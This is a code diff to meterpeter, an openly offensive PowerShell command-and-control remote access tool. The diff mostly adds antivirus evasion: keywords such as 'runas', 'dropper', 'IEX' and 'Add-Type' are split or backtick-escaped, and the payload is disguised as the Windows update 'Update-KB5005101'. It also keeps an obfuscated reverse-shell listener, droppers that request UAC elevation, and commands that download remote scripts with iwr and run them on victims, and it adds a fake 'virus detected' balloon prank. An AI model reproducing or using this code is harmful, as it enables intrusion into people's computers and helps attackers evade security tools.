@@ -3,17 +3,19 @@
 #   Tested Under: Windows 10 (19044) x64 bits
 #   Required Dependencies: Invoke-WebRequest
 #   Optional Dependencies: BitsTransfer|Python
-#   PS cmdlet Dev version: v2.10.13
-#   PS cmdlet sub version: v2.10.13.6
+#   PS cmdlet Dev version: V2.10.14
+#   PS cmdlet sub version: V2.10.14.0
 #   GitHub: https://github.com/r00t-3xp10it/meterpeter/releases
 ##
 
 $SserverTime = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
 $HTTP_PORT = "8087"                 # Python http.server LPort (optional)
-$CmdLetVersion = "2.10.13"          # meterpeter C2 version (dont change)
-$DeveloVersion = "2.10.13.6"        # meterpeter C2 dev version (dont change)
+$CmdLetVersion = "2.10.14"          # meterpeter C2 version (dont change)
+$DeveloVersion = "2.10.14.0"        # meterpeter C2 dev version (dont change)
 $payload_name = "Update-KB5005101"  # Client-payload filename (dont change)
-$Dropper_Name = "Update-KB5005101"  # Payload-dropper filename (optional)
+$Dropper_Name = "Update-KB5005101"  # Payload-dropp`er filename (optional)
+$Acdst = "rem#ote ac#ce#ss" -replace '#',''
+$Acdts = "ob#fus#cat#ed" -replace '#',''
 
 $EndBanner = @"
 
@@ -31,10 +33,10 @@ $StartBanner = @"
  |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
  Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}
 
- Meterpeter its a command & control (C2) remote access tool (rat)
+ Meterpeter its a command & control (C2) $Acdst tool (rat)
  written in pure powershell released to windows (python3 required)
  or to linux (powershell and apache2 required) distros. It creates
- reverse_tcp_shell payloads (pure powershell + sockets) obfuscated
+ reverse_tcp_shell payloads (pure powershell + sockets) $Acdts
  in BXOR using a secret key and also creates one dropper file that
  allow users to fast deliver the payload on LAN networks for tests.
 "@;
@@ -164,7 +166,7 @@ function NetworkStats($IP,$Port,$Base64_Key){
 
 Clear-Host;
 Write-Host $StartBanner
-write-host "      * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n`n" -ForegroundColor DarkYellow
+write-host "     * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n`n" -ForegroundColor DarkYellow
 $DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
 If($DISTRO_OS)
 {
@@ -253,7 +255,7 @@ Write-Host "$PowerShell_Payload" -ForeGroundColor black -BackGroundColor white
 write-host "`n`n"
 $My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
 
-## Better obfuscated IE`X system call
+## Better obfu`scated IE`X system call
 $ttl = ("I" + "@_`X" -Join '') -replace '@_','E'
 #((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss'|Out-File bios.log;&(''.SubString.ToString()[67,72,64]-Join'')")|Set-Content -Path $IPATH$payload_name.ps1
 ((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&('REX' -replace 'R','I')")|Set-Content -Path $IPATH$payload_name.ps1
@@ -276,7 +278,7 @@ If($check -ieq $False)
     $Webroot_test = Test-Path -Path "$env:LocalAppData\webroot\";
     If($Webroot_test -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\";mkdir $APACHE|Out-Null}else{mkdir $APACHE|Out-Null};
     ## Attacker: Windows - with python3 installed
-    # Deliver Dropper.zip using python http.server
+    # Deliver Dro`pper.zip using python http.server
     write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
     write-Host "   ---------    ------                -------               -------";
     write-Host "   Python3      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
@@ -288,7 +290,7 @@ If($check -ieq $False)
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload HTA dropper application
+          Helper - meterpeter payload HTA drop`per application
        #>
 
        cd $Bin
@@ -333,7 +335,7 @@ If($check -ieq $False)
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload EXE dropper application
+          Helper - meterpeter payload EXE dro`pper application
        #>
 
        cd $Bin
@@ -360,7 +362,7 @@ If($check -ieq $False)
        #Compress EXE executable and port the ZIP archive to 'webroot' directory!
        Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force
 
-       #Revert meterpeter EXE template to default state, after successfully created\compressed the binary dropper (PE)
+       #Revert meterpeter EXE template to default state, after successfully created\compressed the binary drop`per (PE)
        ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Dropper_Bat"
 
        #Clean all artifacts left behind by this function!
@@ -376,13 +378,13 @@ If($check -ieq $False)
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload VBS dropper application
+          Helper - meterpeter payload VBS drop`per application
 
        .NOTES
           This function accepts ip addresses from 11 to 14 chars (local)
           example: 192.168.1.1 (11 chars) to 192.168.101.122 (15 chars)
 
-          The 'auto-elevation' function requires UAC enabled and runas.
+          The 'auto-elevation' function requires UAC enabled and ru`nas.
        #>
 
        If(-not(Test-Path -Path "$IPATH\Download_Crandle.vbs" -EA SilentlyContinue))
@@ -391,7 +393,7 @@ If($check -ieq $False)
           iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/crandle_builder.ps1" -OutFile "crandle_builder.ps1"|Unblock-File
        }
 
-       #Evasion\Obfuscation
+       #Evasion\Obfusca`tion
        $NumberOfChars = $Local_Host.length
        $SeconRange = $Server_port[5,6,7,8] -join ''                         # 68.1
        $FirstRange = $Server_port[0,1,2,3,4] -join ''                       # 192.1
@@ -462,7 +464,7 @@ If($check -ieq $False)
 
           .NOTES
              This function add's a cmdline to the beggining of the vbs script file
-             that invokes 'runas' to spawn a UAC dialogbox to elevate appl privileges.
+             that invokes 'ru`nas' to spawn a UAC dialogbox to elevate appl privileges.
 
              None execution its achieved (crandler) if the target user does not
              accept to run the crandler with elevated privileges (UAC dialogBox)
@@ -475,7 +477,7 @@ If($check -ieq $False)
           powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -PayloadName "$PayloadName" -UACElevation 'false' -Technic "$Technic" -Egg 'true'|Out-Null
        }
 
-       #Replace the attacker ip addr (obfuscated\split) on vbs template
+       #Replace the attacker ip addr (obfus`cated\split) on vbs template
        ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "Download_Crandle.vbs"
        ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "Download_Crandle.vbs"
        ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "NAVIGATOR","$trithRange")|Set-Content -Path "Download_Crandle.vbs"
@@ -483,13 +485,13 @@ If($check -ieq $False)
        #Download vbs_obfuscator from GitHub repository
        #iwr -uri https://raw.githubusercontent.com/DoctorLai/VBScript_Obfuscator/master/vbs_obfuscator.vbs -outfile vbs_obfuscator.vbs|Unblock-File
 
-       #Obfuscate Program.vbs sourcecode.
+       #Obfusc`ate Program.vbs sourcecode.
        #cscript.exe vbs_obfuscator.vbs Download_Crandle.vbs > Buffer.vbs
 
        #Parse data
        $CrandleVbsName = "${Dropper_Name}" + ".vbs" -Join '' # Update-KB500101.vbs
-       #$ObfuscatedData = Get-Content Buffer.vbs | Select-Object -Skip 3
-       #echo $ObfuscatedData > $CrandleVbsName
+       #$Obfusc`atedData = Get-Content Buffer.vbs | Select-Object -Skip 3
+       #echo $Obfusc`atedData > $CrandleVbsName
 
 
        Start-sleep -Milliseconds 300
@@ -503,9 +505,9 @@ If($check -ieq $False)
 
 
        ### COMPILE VBS TO EXE
-       #C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /target:exe /out:"$pwd\${Dropper_Name}.exe" "$pwd\${Dropper_Name}.vbs" /platform:anyCPU
+       #C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /target:exe /out:"$pwd\${Drop`per_Name}.exe" "$pwd\${Dropp`er_Name}.vbs" /platform:anyCPU
        Compress-Archive -LiteralPath "$CrandleVbsName" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
-       #Move-Item -Path "$CrandleVbsName" -Destination "${APACHE}${Dropper_Name}.vbs" -Force
+       #Move-Item -Path "$CrandleVbsName" -Destination "${APACHE}${Drop`per_Name}.vbs" -Force
 
        #Clean all artifacts left behind
        Remove-Item -Path "Buffer.vbs" -EA SilentlyContinue -force
@@ -520,10 +522,10 @@ If($check -ieq $False)
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload BAT dropper script
+          Helper - meterpeter payload BAT drop`per script
        #>
 
-       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
+       ## (ZIP + add LHOST) to dro`pper.bat before send it to apache 2 webroot ..
        Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
        ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path $Bin$Dropper_Name.bat
 
@@ -539,11 +541,12 @@ If($check -ieq $False)
           .NOTES
              This function add's a cmdline to the beggining of bat file that uses
              'Net Session' API to check for admin privs before executing powershell
-             -runas on current process spawning a UAC dialogbox of confirmation.
+             -run`as on current process spawning a UAC dialogbox of confirmation.
           #>
 
+          $MyRunes = "r" + "una" + "s" -join ''
           #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
-          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
+          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb $MyRunes '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
        }
 
        Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force
@@ -565,13 +568,13 @@ If($check -ieq $False)
     #tinyurl function
     powershell -file "${IPATH}\Mimiratz\shorturl.ps1" -ServerPort "$Server_port" -PayloadName "${Dropper_Name}.html"
 
-    ## Start python http.server (To Deliver Dropper/Payload)
+    ## Start python http.server (To Deliver Drop`per/Payload)
     Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;$PInterpreter -m http.server $HTTP_PORT --bind $Local_Host";
   }
   else
   {
     ## Attacker: Windows - without python3 installed
-    # Manualy Deliver Dropper.ps1 To Target Machine
+    # Manualy Deliver Drop`per.ps1 To Target Machine
     write-Host "   WebServer      Client                Local Path" -ForegroundColor Green;
     write-Host "   ---------      ------                ----------";
     write-Host "   NotInstalled   Update-KB5005101.ps1  $IPATH";write-host "`n`n";
@@ -580,8 +583,8 @@ If($check -ieq $False)
     Write-Host "[*] Remark: Dropper Demonstration $payload_name.bat created .." -ForeGroundColor yellow;
 
 ## Function for @Daniel_Durnea
-# That does not have Python3 (http.server) installed to build Droppers (download crandles)
-# This Demostration Dropper allow us to execute payload.ps1 in a hidden terminal windows ;)
+# That does not have Python3 (http.server) installed to build Drop`pers (download crandles)
+# This Demostration Drop`per allow us to execute payload.ps1 in a hidden terminal windows ;)
 $DemoDropper = @("#echo off
 powershell (New-Object -ComObject Wscript.Shell).Popup(`"Executing $payload_name.ps1 payload`",4,`"$payload_name Security Update`",0+64)
 powershell -WindowStyle hidden -File $payload_name.ps1
@@ -594,7 +597,7 @@ echo $DemoDropper|Out-File "$payload_name.bat" -Encoding string -Force
 else
 {
   ## Attacker: Linux - Apache2 webserver
-  # Deliver Dropper.zip using Apache2 webserver
+  # Deliver Dro`pper.zip using Apache2 webserver
   write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
   write-Host "   ---------    ------                -------               -------";
   write-Host "   Apache2      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
@@ -606,7 +609,7 @@ else
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload HTA dropper application
+          Helper - meterpeter payload HTA drop`per application
        #>
 
        cd $Bin
@@ -628,7 +631,7 @@ else
 
        #Embebed meterpter icon on HTA application?
        #iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
-       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dropper_Name.hta" -Wait
+       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dro`pper_Name.hta" -Wait
 
        #Compress HTA application and port the ZIP archive to 'webroot' directory!
        Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
@@ -650,11 +653,11 @@ else
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Helper - meterpeter payload BAT dropper script
+          Helper - meterpeter payload BAT dro`pper script
        #>
 
        Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
-       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
+       ## (ZIP + add LHOST) to drop`per.bat before send it to apache 2 webroot ..
        ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Local_Host")|Set-Content -Path $Bin$Dropper_Name.bat;
 
        $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
@@ -669,11 +672,12 @@ else
           .NOTES
              This function add's a cmdline to the beggining of bat file that uses
              'Net Session' API to check for admin privs before executing powershell
-             -runas on current process spawning a UAC dialogbox of confirmation.
+             -ru`nas on current process spawning a UAC dialogbox of confirmation.
           #>
 
+          $MyRunes = "r" + "una" + "s" -join ''
           #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
-          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
+          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb $MyRunes '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
        }
 
        Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force;
@@ -721,8 +725,8 @@ If($RunEXElevated -iMatch '^(y|yes)$')
    .NOTES
      This migth trigger av detection on payload (danger)
      @Ahmed_Ben_Mhamed uses the payload.PS1 of meterpeter C2
-     to exploit targets over WAN networks, but UAC elevation
-     its only available by default in droppers. (untill now) 
+     to expl`oit targets over WAN networks, but UAC elevation
+     its only available by default in drop`pers. (untill now) 
    #>
 
    $OLD = (Get-Content -Path "${IPATH}${payload_name}.ps1" -Raw)
@@ -740,7 +744,7 @@ $ola = 'Creat' + 'eInstance' -join ''
 $Bytes = [System.Byte[]]::$ola([System.Byte],1024);
 Write-Host "[*] Listening on LPort: $Local_Port tcp";
 
-## $Socket - Obfuscation
+## $Socket - Obfuscat`ion
 ${/$.}=+$(  )  ;  ${).!}  =${/$.}  ;${#~}  =  ++  ${/$.}  ;  ${[/}  =(  ${/$.}  =${/$.}  +  ${#~}  )  ;${.-}  =  (  ${/$.}  =${/$.}+  ${#~}  );  ${.$)}=  (${/$.}  =  ${/$.}  +${#~}  )  ;${/@}  =  (${/$.}  =${/$.}+${#~}  )  ;${)/}=(${/$.}=${/$.}+${#~}  )  ;  ${#-*}  =(  ${/$.}=  ${/$.}+  ${#~});${;}=  (${/$.}  =${/$.}+  ${#~}  )  ;${``[@}  =  (${/$.}  =  ${/$.}+${#~}  )  ;${[}=  "["  +  "$(  @{}  )  "[${#-*}]+  "$(@{  })"[  "${#~}"  +  "${``[@}"]+"$(  @{}  )  "["${[/}"  +  "${).!}"]+  "$?"[${#~}  ]  +  "]"  ;${/$.}  =  "".("$(@{  })  "[  "${#~}${.$)}"]+"$(@{  })"["${#~}${)/}"]+"$(  @{  }  )  "[  ${).!}  ]  +"$(  @{  })  "[${.$)}]  +"$?  "[${#~}  ]+"$(  @{})  "[${.-}]  )  ;  ${/$.}=  "$(  @{  }  )  "["${#~}"+  "${.$)}"]  +  "$(  @{})  "[  ${.$)}  ]  +"${/$.}"[  "${[/}"  +"${#-*}"]  ;&${/$.}  ("  ${/$.}  (${[}${.-}${)/}+  ${[}${;}${.-}+  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}  +  ${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}+${[}${#~}${#~}${)/}+${[}${.-}${[/}+  ${[}${)/}${#~}  +${[}${.-}${[/}+${[}${#-*}${;}  +${[}${#~}${).!}${#~}  +${[}${#~}${#~}${``[@}+  ${[}${.$)}${/@}+${[}${#-*}${``[@}+  ${[}${``[@}${;}+  ${[}${#~}${).!}${)/}  +${[}${#~}${).!}${#~}  +  ${[}${``[@}${``[@}  +${[}${#~}${#~}${)/}  +${[}${.-}${[/}  +${[}${;}${.-}+${[}${#~}${[/}${#~}  +${[}${#~}${#~}${/@}+${[}${#~}${#~}${)/}  +${[}${#~}${).!}${#~}+  ${[}${#~}${).!}${``[@}  +  ${[}${.$)}${)/}  +  ${[}${#-*}${;}  +  ${[}${#~}${).!}${#~}+  ${[}${#~}${#~}${)/}  +  ${[}${.$)}${)/}+  ${[}${;}${.-}  +  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}+${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}  +  ${[}${#~}${#~}${)/}  +${[}${#~}${#~}${/@}  +${[}${.$)}${)/}  +  ${[}${;}${.$)}  +${[}${``[@}${``[@}  +  ${[}${#~}${#~}${[/}+  ${[}${#-*}${)/}+  ${[}${#~}${).!}${/@}+${[}${#~}${#~}${/@}  +  ${[}${#~}${#~}${)/}+${[}${#~}${).!}${#~}  +${[}${#~}${#~}${).!}  +  ${[}${#~}${).!}${#~}  +${[}${#~}${#~}${.$)}  +  ${[}${.$)}${).!}+${[}${.-}${``[@}  +${[}${.$)}${;}+${[}${.$)}${)/}  +${[}${.$)}${;}  +${[}${.$)}${)/}  +  ${[}${.$)}${;}  +  ${[}${.$)}${)/}+  ${[}${.$)}${;}  +  ${[}${.-}${``[@}  +${[}${.$)}${.$)}  +  ${[}${.-}${)/}+  ${[}${#-*}${)/}+${[}${#~}${#~}${#~}+  ${[}${``[@}${``[@}+${[}${``[@}${#-*}  +${[}${#~}${).!}${;}+  ${[}${``[@}${/@}  +${[}${;}${).!}  +${[}${#~}${#~}${#~}  +${[}${#~}${#~}${.$)}+${[}${#~}${#~}${)/}  +  ${[}${.$)}${#~}  +${[}${/@}${``[@}  )")
 
 $Socket.Start();
@@ -863,11 +867,68 @@ While($Client.Connected)
       write-host "   GoogleX        Browser google easter eggs manager";
       write-host "   WindowsUpdate  Fake windows update full screen prank";
       write-host "   CriticalError  Prank that fakes a critical system error";
+      write-host "   BallonTip      Show a ballon tip in the notification bar";
       write-host "   Nodrives       Hide All Drives (C:D:E:F:G) From Explorer";
       write-host "   LabelDrive     Rename drive letter (C:) label From Explorer";
       write-host "   Return         Return to Server Main Menu" -ForeGroundColor yellow
       write-host "`n`n :meterpeter:Pranks> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
+      If($choise -ieq "BallonTip")
+      {
+         write-host "`n`n   Description:" -ForegroundColor Yellow
+         write-host "   This module spawn a ballontip in the notification bar"
+         write-host "   Parameter IconType accepts values: Info,Warning,Error"
+         write-host "   Parameter CloseTime accepts milliseconds (example: 10000)"
+         write-host "`n`n   Modules  Description                    Privileges Required" -ForegroundColor green
+         write-host "   -------  -----------                    -------------------"
+         write-host "   Spawn    ballontip in notification bar  UserLand"
+         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
+         write-host "`n`n :meterpeter:Pranks:BallonTip> " -NoNewline -ForeGroundColor Green
+         $Prank_choise = Read-Host;
+         If($Prank_choise -ieq "Spawn")
+         {
+            write-host " - BallonTip Title     : " -NoNewline
+            $Title = Read-Host
+            If([string]::IsNullOrEmpty($Title))
+            {
+               $Title = "Attention `$Env:USERNAME"
+               write-host "   => Error: wrong input, default to: '$Title'" -ForegroundColor Red
+            }
+
+            write-host " - BallonTip Text      : " -NoNewline
+            $Text = Read-Host
+            If([string]::IsNullOrEmpty($Text))
+            {
+               $Text = "A vir`us has detected in `$Env:COMPUTERNAME"
+               write-host "   => Error: wrong input, default to: '$Text'" -ForegroundColor Red
+            }
+
+            write-host " - BallonTip IconType  : " -NoNewline
+            $IconType = Read-Host
+            If([string]::IsNullOrEmpty($IconType))
+            {
+               $IconType = "Warning"
+               write-host "   => Error: wrong input, default to: '$IconType'" -ForegroundColor Red
+            }
+
+            write-host " - BallonTip CloseTime : " -ForegroundColor DarkYellow -NoNewline
+            $CloseTime = Read-Host
+            If([string]::IsNullOrEmpty($CloseTime))
+            {
+               $CloseTime = "10000"
+               write-host "   => Error: wrong input, default to: '$CloseTime'" -ForegroundColor Red
+            }
+
+            write-host " * Spawn a ballontip in the notification bar .." -ForegroundColor Green;Start-Sleep -Seconds 1
+            $Command = "cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Show-BalloonTip.ps1' -OutFile 'Show-BalloonTip.ps1'|Unblock-File;powershell -file `$Env:TMP\Show-BalloonTip.ps1 -title `"$Title`" -text `"$Text`" -icontype `"$IconType`" -autoclose `"$CloseTime`";Remove-Item -Path `$Env:TMP\Show-BalloonTip.ps1 -Force"
+         }
+         If($Prank_choise -ieq "Return" -or $Prank_choise -ieq "cls" -or $Prank_choise -ieq "modules" -or $Prank_choise -ieq "clear")
+         {
+            $choise = $Null;
+            $Command = $Null;
+            $Prank_choise = $Null;
+         }      
+      }
       If($choise -ieq "WindowsUpdate" -or $choise -ieq "WU")
       {
          write-host "`n`n   Description:" -ForegroundColor Yellow
@@ -883,7 +944,7 @@ While($Client.Connected)
          If($Prank_choise -ieq "Start")
          {
             write-host " * Faking windows system update ..`n" -ForegroundColor Green;Start-Sleep -Seconds 1
-            $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1' -OutFile 'FWUprank.ps1'|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList '-file FWUprank.ps1 -autodelete on';echo '   `> Windows system update prank running in background!' `> trash.mtp;Get-Content trash.mtp;Remove-Item trash.mtp -Force"
+            $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1' -OutFile 'FWUprank.ps1'|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList '-file FWUprank.ps1 -autodelete on';echo '   `> Windows system update prank running in background!' `> trash.mtp;echo '   `> URI: https://fakeupdate.net/[SystemOS]/~{F11}' `>`> trash.mtp;Get-Content trash.mtp;Remove-Item trash.mtp -Force"
          }
          If($Prank_choise -ieq "Return" -or $Prank_choise -ieq "cls" -or $Prank_choise -ieq "modules" -or $Prank_choise -ieq "clear")
          {
@@ -959,12 +1020,10 @@ While($Client.Connected)
       If($choise -ieq "CriticalError")
       {
          $MaxInteractions = Read-Host " - How many times to loop prank?  (8) "
-         [int]$DelayTime = Read-Host " - The delay time between loops?  (6) "
+         $DelayTime = Read-Host " - The delay time between loops?  (9) "
 
-         If([int]$DelayTime -gt 30){[int]$DelayTime = '8'}
-         If([int]$MaxInteractions -gt 30){$MaxInteractions = "20"}
-         If([string]::IsNullOrEmpty($DelayTime)){[int]$DelayTime = '8'}
-         If([string]::IsNullOrEmpty($MaxInteractions)){$MaxInteractions = "20"}
+         If([string]::IsNullOrEmpty($DelayTime)){$DelayTime = "9"}
+         If([string]::IsNullOrEmpty($MaxInteractions)){$MaxInteractions = "8"}
 
          Write-Host " * Faking a critical system error (BSOD)" -ForegroundColor Green
          Write-Host "   => Takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow
@@ -1046,12 +1105,12 @@ While($Client.Connected)
             $MsgBoxAppli = Read-Host " - PS Cmdline to execute "
             If(-not($MsgBoxAppli) -or $MsgBoxAppli -ieq $null)
             {
-               $MsgBoxAppli = "cmd /c start calc.exe"
+               $MsgBoxAppli = "cmd /R start calc.exe"
                Write-Host "   => Error: wrong input, set demo to '$MsgBoxAppli'" -ForegroundColor Red
             }
 
             Write-Host " * Spawn msgbox that exec cmdline" -ForegroundColor Green
-            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|Invoke-Expression;echo `"`n   `> Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   `> Fail to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
+            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|&('Sex' -replace 'S','I');echo `"`n   `> Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   `> Fail to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
          }
          If($msgbox_choise -ieq "Return" -or $msgbox_choise -ieq "cls" -or $msgbox_choise -ieq "modules" -or $msgbox_choise -ieq "clear")
          {
@@ -1078,13 +1137,15 @@ While($Client.Connected)
            If(-not ($MYSpeak -ieq $False -or $MYSpeak -eq ""))
            {
              write-host ""
-             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+             $Mytype = "Ad" + "d-Ty" + "pe " + "-Assembl" + "yName" -join ''
+             $Command = "`$My_Line = `"$MYSpeak`";$Mytype System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
            }
            Else
            {
              write-host "";
              $MYSpeak = "Next time dont forget to input the text ok?";
-             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+             $Mytype = "Ad" + "d-Ty" + "pe " + "-Assembl" + "yName" -join ''
+             $Command = "`$My_Line = `"$MYSpeak`";$Mytype System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
            }
         }
         If($Speak_choise -ieq "Return" -or $Speak_choise -ieq "cls" -or $Speak_choise -ieq "Modules" -or $Speak_choise -ieq "clear")
@@ -1509,7 +1570,7 @@ While($Client.Connected)
       write-host "`n`n   Modules     Description" -ForegroundColor green;
       write-host "   -------     -----------";
       write-host "   Accounts    List remote host accounts";
-      write-host "   RevShell    List client shell information";
+      write-host "   RevS`hell    List client shell information";
       write-host "   ListAppl    List remote host installed appl";
       write-host "   Processes   List remote host processes info";
       write-host "   Tasks       List remote host schedule tasks";
@@ -1806,7 +1867,7 @@ While($Client.Connected)
             $Execute = Read-Host
             If(-not($Execute))
             {
-               $Execute = "cmd /c start calc.exe"
+               $Execute = "cmd /R start calc.exe"
                write-host "   => Wrong setting, set Execute to: $Execute" -ForegroundColor Red                   
             }
 
@@ -1844,7 +1905,7 @@ While($Client.Connected)
             $Execute = Read-Host
             If(-not($Execute))
             {
-               $Execute = "cmd /c start calc.exe"
+               $Execute = "cmd /R start calc.exe"
                write-host "   => Wrong setting, set Execute to: $Execute" -ForegroundColor Red                   
             }
 
@@ -1978,12 +2039,12 @@ While($Client.Connected)
             write-host "   => Slipt diferent strings to search with PIPE (|) command." -ForegroundColor DarkYellow;
             Start-Sleep -Seconds 1
             
-            Write-Host " - Search for string (antimalware|sandboxing): " -NoNewline;
